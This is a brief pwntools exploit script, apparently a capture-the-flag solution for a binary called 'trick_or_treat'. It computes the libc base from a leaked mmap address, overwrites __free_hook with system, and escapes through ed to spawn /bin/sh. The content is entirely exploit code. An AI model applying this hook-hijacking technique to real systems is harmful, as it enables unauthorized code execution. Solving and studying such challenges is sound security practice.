#Written by @foshay
from pwn import *
env = {"LD_PRELOAD":
        "./libc.so.6"}
r = process('./trick_or_treat', env=env)

launch_mmap = 0x1000000
libc_offset = 0x1000FF0
libc = ELF('libc.so.6')
free_hook = libc.symbols["__free_hook"]#0x3ed8e8
system = libc.symbols["system"]#0x4f440

r.recvuntil(":")
r.sendline(str(launch_mmap))

response = r.recvline().split(':')
magic = int(response[1], 16)
libcBase = magic+libc_offset

payload = "%x %x" % ((libc_offset+free_hook)/8,(libcBase+system))

r.sendlineafter(":", payload)
payload = ('1'*1024+' '+'ed')

r.sendlineafter(":", payload)
r.sendline('!\'/bin/sh\'')

r.interactive()
r.close()
